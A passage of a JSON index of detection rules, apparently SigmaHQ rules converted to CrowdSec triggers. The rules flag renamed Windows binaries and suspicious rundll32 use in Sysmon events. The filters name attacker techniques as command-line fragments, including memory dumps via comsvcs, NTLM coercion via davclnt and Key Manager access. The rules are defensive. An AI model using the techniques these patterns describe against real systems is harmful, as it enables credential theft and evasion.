a renamed version of the \"Mavinject\" process. Which can be abused to perform process injection using the \"/INJECTRUNNING\" flag\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName in ['mavinject32.exe', 'mavinject64.exe']) && not (evt.Parsed.Image endsWith '\\\\mavinject32.exe' || evt.Parsed.Image endsWith '\\\\mavinject64.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1055.001\n   - attack.t1218.013\n\n  label: \"Renamed Mavinject.EXE Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed version of the \"Mavinject\" process. Which can be abused to perform process injection using the \"/INJECTRUNNING\" flag\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_mavinject.yml", "version": "0.2", "versions": {"0.1": {"digest": "e93b90ec464608be038e995fafba57e751de9d8d827bb925a9c7d79d56f4666b"}, "0.2": {"digest": "de7d5d789a77775f028b779de28628c99a4b2c58a6df84192ca6e1bfd7106835"}}}, "sigmahq/proc_creation_win_renamed_megasync": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_megasync\ndescription: |\n  Detects the execution of a renamed MegaSync.exe as seen used by ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'megasync.exe' && not (evt.Parsed.Image endsWith '\\\\megasync.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Renamed MegaSync Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed MegaSync.exe as seen used by ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_megasync.yml", "version": "0.2", "versions": {"0.1": {"digest": "2512869ce70460980200d3d09d450d4cd85fece709f6648814bf62b42f3b6885"}, "0.2": {"digest": "93b09e4348c7a91e3180b6bfa28f8055e578f96b88ab0eeaf5c55a3a474bbebd"}}}, "sigmahq/proc_creation_win_renamed_msdt": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_msdt\ndescription: |\n  Detects the execution of a renamed \"Msdt.exe\" binary\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'msdt.exe' && not (evt.Parsed.Image endsWith '\\\\msdt.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036.003\n\n  label: \"Renamed Msdt.EXE Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed \"Msdt.exe\" binary\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_msdt.yml", "version": "0.2", "versions": {"0.1": {"digest": "6c2de019e2a909cba6b9af73791802185e6451b838e2e5782f9117d506dddbe2"}, "0.2": {"digest": "16bca4b8cb07923cd80c72d9ed399292c0ff106a1bdfe1cd4336aa37273fde5d"}}}, "sigmahq/proc_creation_win_renamed_netsupport_rat": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_netsupport_rat\ndescription: |\n  Detects the execution of a renamed \"client32.exe\" (NetSupport RAT) via Imphash, Product and OriginalFileName strings\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Product contains 'NetSupport Remote Control' || evt.Parsed.OriginalFileName contains 'client32.exe' || evt.Parsed.Imphash == 'a9d50692e95b79723f3e76fcf70d023e' || evt.Parsed.Hashes contains 'IMPHASH=A9D50692E95B79723F3E76FCF70D023E') && not (evt.Parsed.Image endsWith '\\\\client32.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Renamed NetSupport RAT Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed \"client32.exe\" (NetSupport RAT) via Imphash, Product and OriginalFileName strings\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_netsupport_rat.yml", "version": "0.2", "versions": {"0.1": {"digest": "bcb2db6754ff9ffc7ab15a4739f346d81c0cfe34b7f88d1c37face9808bd5a4f"}, "0.2": {"digest": "53acc5637f34d23eef79f170ab20ffcd0653a6d51ed0069ab0a85942db589bc1"}}}, "sigmahq/proc_creation_win_renamed_office_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_office_processes\ndescription: |\n  Detects the execution of a renamed office binary\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName in ['Excel.exe', 'MSACCESS.EXE', 'MSPUB.EXE', 'OneNote.exe', 'OneNoteM.exe', 'OUTLOOK.EXE', 'POWERPNT.EXE', 'WinWord.exe'] || evt.Parsed.Description in ['Microsoft Access', 'Microsoft Excel', 'Microsoft OneNote', 'Microsoft Outlook', 'Microsoft PowerPoint', 'Microsoft Publisher', 'Microsoft Word', 'Sent to OneNote Tool']) && not (evt.Parsed.Image endsWith '\\\\EXCEL.exe' || evt.Parsed.Image endsWith '\\\\excelcnv.exe' || evt.Parsed.Image endsWith '\\\\MSACCESS.exe' || evt.Parsed.Image endsWith '\\\\MSPUB.EXE' || evt.Parsed.Image endsWith '\\\\ONENOTE.EXE' || evt.Parsed.Image endsWith '\\\\ONENOTEM.EXE' || evt.Parsed.Image endsWith '\\\\OUTLOOK.EXE' || evt.Parsed.Image endsWith '\\\\POWERPNT.EXE' || evt.Parsed.Image endsWith '\\\\WINWORD.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Renamed Office Binary Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed office binary\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_office_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "b40dae0da9975fedd81d6354b5d153cf1ee4bd41e75386be9f610e1218291077"}, "0.2": {"digest": "e976bf7917dcce30859c1fdaa9d20f1d853a85ad25501805565dc3c715b9f79a"}}}, "sigmahq/proc_creation_win_renamed_paexec": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_paexec\ndescription: |\n  Detects execution of renamed version of PAExec. Often used by attackers\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Description == 'PAExec Application' || evt.Parsed.OriginalFileName == 'PAExec.exe' || evt.Parsed.Product contains 'PAExec' || evt.Parsed.Imphash in ['11D40A7B7876288F919AB819CC2D9802', '6444f8a34e99b8f7d9647de66aabe516', 'dfd6aa3f7b2b1035b76b718f1ddc689f', '1a6cca4d5460b1710a12dea39e4a592c'] || evt.Parsed.Hashes contains 'IMPHASH=11D40A7B7876288F919AB819CC2D9802' || evt.Parsed.Hashes contains 'IMPHASH=6444f8a34e99b8f7d9647de66aabe516' || evt.Parsed.Hashes contains 'IMPHASH=dfd6aa3f7b2b1035b76b718f1ddc689f' || evt.Parsed.Hashes contains 'IMPHASH=1a6cca4d5460b1710a12dea39e4a592c') && not (evt.Parsed.Image endsWith '\\\\paexec.exe' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\PAExec-'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1202\n\n  label: \"Renamed PAExec Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of renamed version of PAExec. Often used by attackers\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_paexec.yml", "version": "0.2", "versions": {"0.1": {"digest": "4cef6c95d40558789912164cf767567cf47ea6c14cabd38eaf0df9b72a0a2bdc"}, "0.2": {"digest": "29a0fbbf0350678dd1f85855bbe55d1e472ee18b795b85bbcbc30ae17e760487"}}}, "sigmahq/proc_creation_win_renamed_plink": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_plink\ndescription: |\n  Detects the execution of a renamed version of the Plink binary\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'Plink' || evt.Parsed.CommandLine contains ' -l forward' && evt.Parsed.CommandLine contains ' -P ' && evt.Parsed.CommandLine contains ' -R ') && not (evt.Parsed.Image endsWith '\\\\plink.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n\n  label: \"Renamed Plink Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed version of the Plink binary\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_plink.yml", "version": "0.2", "versions": {"0.1": {"digest": "8b80e5edfcaa619c0ce8e5100ace198049809a60e70b7c35c7e1278ec53e1b01"}, "0.2": {"digest": "180d23c96fbe6e7f0cdf9ffb7b1e29c9722c4ad239258cdc5c5bb9ea8cca895d"}}}, "sigmahq/proc_creation_win_renamed_rundll32_dllregisterserver": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_rundll32_dllregisterserver\ndescription: |\n  Detects when 'DllRegisterServer' is called in the commandline and the image is not rundll32. This could mean that the 'rundll32' utility has been renamed in order to avoid detection\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'DllRegisterServer' && not (evt.Parsed.Image endsWith '\\\\rundll32.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potential Renamed Rundll32 Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when 'DllRegisterServer' is called in the commandline and the image is not rundll32. This could mean that the 'rundll32' utility has been renamed in order to avoid detection\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_rundll32_dllregisterserver.yml", "version": "0.2", "versions": {"0.1": {"digest": "95ce752682093bb2af61588d7e8682d15d72fde30564e2953c0425ba79385e4f"}, "0.2": {"digest": "3f838d98d414a4319e3a27ae51fa4e3f4f4d13fc7550b863a4de93b6e2ee67d3"}}}, "sigmahq/proc_creation_win_renamed_sysinternals_debugview": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_sysinternals_debugview\ndescription: |\n  Detects suspicious renamed SysInternals DebugView execution\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Product == 'Sysinternals DebugView' && not (evt.Parsed.OriginalFileName == 'Dbgview.exe' && evt.Parsed.Image endsWith '\\\\Dbgview.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1588.002\n\n  label: \"Renamed SysInternals DebugView Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious renamed SysInternals DebugView execution\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_sysinternals_debugview.yml", "version": "0.2", "versions": {"0.1": {"digest": "5b6dc6c84752f716ccf486952d9b4d8551dd82d167b2218e367d75bec61074c9"}, "0.2": {"digest": "be5363428519ff767b736a25e7db9a22cda8a706fa375bc3df8e8f97e9aef51b"}}}, "sigmahq/proc_creation_win_renamed_sysinternals_procdump": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_sysinternals_procdump\ndescription: |\n  Detects the execution of a renamed ProcDump executable. This often done by attackers or malware in order to evade defensive mechanisms. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'procdump' || (evt.Parsed.CommandLine contains ' -ma ' || evt.Parsed.CommandLine contains ' /ma ' || evt.Parsed.CommandLine contains ' \u2013ma ' || evt.Parsed.CommandLine contains ' \u2014ma ' || evt.Parsed.CommandLine contains ' \u2015ma ' || evt.Parsed.CommandLine contains ' -mp ' || evt.Parsed.CommandLine contains ' /mp ' || evt.Parsed.CommandLine contains ' \u2013mp ' || evt.Parsed.CommandLine contains ' \u2014mp ' || evt.Parsed.CommandLine contains ' \u2015mp ') && (evt.Parsed.CommandLine contains ' -accepteula' || evt.Parsed.CommandLine contains ' /accepteula' || evt.Parsed.CommandLine contains ' \u2013accepteula' || evt.Parsed.CommandLine contains ' \u2014accepteula' || evt.Parsed.CommandLine contains ' \u2015accepteula')) && not (evt.Parsed.Image endsWith '\\\\procdump.exe' || evt.Parsed.Image endsWith '\\\\procdump64.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036.003\n\n  label: \"Renamed ProcDump Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed ProcDump executable. This often done by attackers or malware in order to evade defensive mechanisms. \n", "path": "scenarios/sigmahq/proc_creation_win_renamed_sysinternals_procdump.yml", "version": "0.2", "versions": {"0.1": {"digest": "346f8c819d66fa478aad289b0220f8b8f633fdaa1eec15a524a4d3d5903f7951"}, "0.2": {"digest": "1c5d81843a0333c62910304d096579ef5c31b3fb5bb3ca7a1ece96806750a884"}}}, "sigmahq/proc_creation_win_renamed_sysinternals_psexec_service": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_sysinternals_psexec_service\ndescription: |\n  Detects suspicious launch of a renamed version of the PSEXESVC service with, which is not often used by legitimate administrators\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'psexesvc.exe' && not (evt.Parsed.Image == 'C:\\\\Windows\\\\PSEXESVC.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Renamed PsExec Service Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious launch of a renamed version of the PSEXESVC service with, which is not often used by legitimate administrators\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_sysinternals_psexec_service.yml", "version": "0.2", "versions": {"0.1": {"digest": "6eed9ad4f3a3afaeb72eb0dce0e13a5cfb58cae782affb62083e262a3c3a1565"}, "0.2": {"digest": "6db9c04651ee0b96a380a41c29e8563357b268343054c9ed0458b337f677439b"}}}, "sigmahq/proc_creation_win_renamed_sysinternals_sdelete": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_sysinternals_sdelete\ndescription: |\n  Detects the use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'sdelete.exe' && not (evt.Parsed.Image endsWith '\\\\sdelete.exe' || evt.Parsed.Image endsWith '\\\\sdelete64.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1485\n\n  label: \"Renamed Sysinternals Sdelete Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming)\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_sysinternals_sdelete.yml", "version": "0.2", "versions": {"0.1": {"digest": "16aebe602995d434a6ef31cecb3093b1c6898da68ea321f9562409e677a013e4"}, "0.2": {"digest": "12c826fb5182b41aa6322ef8c40e38df490a14dcb8fb8d7963bc5768063f8615"}}}, "sigmahq/proc_creation_win_renamed_vmnat": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_vmnat\ndescription: |\n  Detects renamed vmnat.exe or portable version that can be used for DLL side-loading\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'vmnat.exe' && not (evt.Parsed.Image endsWith 'vmnat.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.002\n\n  label: \"Renamed Vmnat.exe Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects renamed vmnat.exe or portable version that can be used for DLL side-loading\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_vmnat.yml", "version": "0.2", "versions": {"0.1": {"digest": "ca659300e5604bc68700639dac574a97f0706ae7070e560e00f11a1e2f5309ea"}, "0.2": {"digest": "4dad89a85e519814c7ab990c7636de5d0c36be748fa0f317f83538290d4fc953"}}}, "sigmahq/proc_creation_win_renamed_whoami": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_whoami\ndescription: |\n  Detects the execution of whoami that has been renamed to a different name to avoid detection\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'whoami.exe' && not (evt.Parsed.Image endsWith '\\\\whoami.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1033\n\n  label: \"Renamed Whoami Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of whoami that has been renamed to a different name to avoid detection\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_whoami.yml", "version": "0.2", "versions": {"0.1": {"digest": "03c419708bfc624dbc92e959565273a218d21ffb8649dd73e04d100ddcd52140"}, "0.2": {"digest": "30b79e457a495d80cc71851ba964c73cc7477447e884959d9edcb1010d603d4f"}}}, "sigmahq/proc_creation_win_rundll32_ads_stored_dll_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_ads_stored_dll_execution\ndescription: |\n  Detects execution of rundll32 where the DLL being called is stored in an Alternate Data Stream (ADS).\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE') && evt.Parsed.CommandLine matches '[Rr][Uu][Nn][Dd][Ll][Ll]32(\\\\.[Ee][Xx][Ee])? \\\\S+?\\\\w:\\\\S+?:')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1564.004\n\n  label: \"Potential Rundll32 Execution With DLL Stored In ADS\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of rundll32 where the DLL being called is stored in an Alternate Data Stream (ADS).\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_ads_stored_dll_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "904e99d98a0d5839565ad74a81bf1a790ee23dd87bfcda52f7cc38b8160cebe2"}, "0.2": {"digest": "7101f16689dad2be1ce933586aa15d272e13a4fb5dfbf0b027f646714d87b6a1"}}}, "sigmahq/proc_creation_win_rundll32_advpack_obfuscated_ordinal_call": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_advpack_obfuscated_ordinal_call\ndescription: |\n  Detects execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE' || evt.Parsed.CommandLine contains 'rundll32') && evt.Parsed.CommandLine contains 'advpack' && (evt.Parsed.CommandLine contains '#+' && evt.Parsed.CommandLine contains '12' || evt.Parsed.CommandLine contains '#-'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious Advpack Call Via Rundll32.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_advpack_obfuscated_ordinal_call.yml", "version": "0.2", "versions": {"0.1": {"digest": "0eb0f0a7325ac0caec64a3c133e59de0c531940762736358f635e6a2089ba201"}, "0.2": {"digest": "e722cb0b8c0a6d206fc5d28079d344a652d9bf240e1146dba5e32da8628b262d"}}}, "sigmahq/proc_creation_win_rundll32_inline_vbs": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_inline_vbs\ndescription: |\n  Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'rundll32.exe' && evt.Parsed.CommandLine contains 'Execute' && evt.Parsed.CommandLine contains 'RegRead' && evt.Parsed.CommandLine contains 'window.close')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1055\n\n  label: \"Suspicious Rundll32 Invoking Inline VBScript\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_inline_vbs.yml", "version": "0.2", "versions": {"0.1": {"digest": "13e9bebdd60e57526bd38e6df71d0c2dcf316e37f88a2751cff2dae292890ef7"}, "0.2": {"digest": "cdbd431989cc75ea27ac891735f1fb287db4fb1c2cdc31859750577806067e56"}}}, "sigmahq/proc_creation_win_rundll32_keymgr": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_keymgr\ndescription: |\n  Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE') && evt.Parsed.CommandLine contains 'keymgr' && evt.Parsed.CommandLine contains 'KRShowKeyMgr')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1555.004\n\n  label: \"Suspicious Key Manager Access\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager)\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_keymgr.yml", "version": "0.2", "versions": {"0.1": {"digest": "45309fbd9b1d35a2ddb751d4cb1e5bc4298e7624e9695a720f27b443dd678126"}, "0.2": {"digest": "e8cfb787f53d0065a9689fd5e4da7d6e10cb7477218758088df9cdb917ae74ca"}}}, "sigmahq/proc_creation_win_rundll32_mshtml_runhtmlapplication": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_mshtml_runhtmlapplication\ndescription: |\n  Detects execution of commands that leverage the \"mshtml.dll\" RunHTMLApplication export to run arbitrary code via different protocol handlers (vbscript, javascript, file, http...) \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\..\\\\' && evt.Parsed.CommandLine contains 'mshtml' && (evt.Parsed.CommandLine contains '#135' || evt.Parsed.CommandLine contains 'RunHTMLApplication'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Mshtml.DLL RunHTMLApplication Suspicious Usage\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of commands that leverage the \"mshtml.dll\" RunHTMLApplication export to run arbitrary code via different protocol handlers (vbscript, javascript, file, http...) \n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_mshtml_runhtmlapplication.yml", "version": "0.2", "versions": {"0.1": {"digest": "94626ac3d034a2ea596d6e053580eff28d29eda98ede004248fe16986456f54a"}, "0.2": {"digest": "70df0e7e2177eb102391eaa0447ada83c6554b15e0ae2cd61f581717bf9b9f54"}}}, "sigmahq/proc_creation_win_rundll32_no_params": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_no_params\ndescription: |\n  Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine endsWith '\\\\rundll32.exe' || evt.Parsed.CommandLine endsWith '\\\\rundll32.exe\"' || evt.Parsed.CommandLine endsWith '\\\\rundll32') && not (evt.Parsed.ParentImage contains '\\\\AppData\\\\Local\\\\' || evt.Parsed.ParentImage contains '\\\\Microsoft\\\\Edge\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1202\n\n  label: \"Rundll32 Execution Without CommandLine Parameters\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_no_params.yml", "version": "0.2", "versions": {"0.1": {"digest": "c1c103a030902b1baa0608520af6f8e5d996fbed54ae6697a0cdc9b5eea4bba1"}, "0.2": {"digest": "b968737633ab0bedadea8d3721526141d128db0dc69892cb3633a721bc3b23eb"}}}, "sigmahq/proc_creation_win_rundll32_ntlmrelay": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_ntlmrelay\ndescription: |\n  Detects a privilege elevation attempt by coercing NTLM authentication on the Printer Spooler service\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE') && evt.Parsed.CommandLine contains 'C:\\\\windows\\\\system32\\\\davclnt.dll,DavSetCookie' && evt.Parsed.CommandLine contains 'http' && (evt.Parsed.CommandLine contains 'spoolss' || evt.Parsed.CommandLine contains 'srvsvc' || evt.Parsed.CommandLine contains '/print/pipe/'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1212\n\n  label: \"Suspicious NTLM Authentication on the Printer Spooler Service\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a privilege elevation attempt by coercing NTLM authentication on the Printer Spooler service\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_ntlmrelay.yml", "version": "0.2", "versions": {"0.1": {"digest": "c1c6942cf600b3b81247d2c40d07c1e1615e072e738e5f47dbf9930904e76361"}, "0.2": {"digest": "42848784a555fd875c7f44933eb328ffd433f61b6ffa83fa568880caeb12e326"}}}, "sigmahq/proc_creation_win_rundll32_process_dump_via_comsvcs": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_process_dump_via_comsvcs\ndescription: |\n  Detects a process memory dump via \"comsvcs.dll\" using rundll32, covering multiple different techniques (ordinal, minidump function, etc.)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE' || evt.Parsed.CommandLine contains 'rundll32') && evt.Parsed.CommandLine contains 'comsvcs' && evt.Parsed.CommandLine contains 'full' && (evt.Parsed.CommandLine contains '#-' || evt.Parsed.CommandLine contains '#+' || evt.Parsed.CommandLine contains '#24' || evt.Parsed.CommandLine contains '24 ' || evt.Parsed.CommandLine contains 'MiniDump') || evt.Parsed.CommandLine contains '24' && evt.Parsed.CommandLine contains 'comsvcs' && evt.Parsed.CommandLine contains 'full' && (evt.Parsed.CommandLine contains ' #' || evt.Parsed.CommandLine contains ',#' || evt.Parsed.CommandLine contains ', #'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1003.001\n\n  label: \"Process Memory Dump Via Comsvcs.DLL\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a process memory dump via 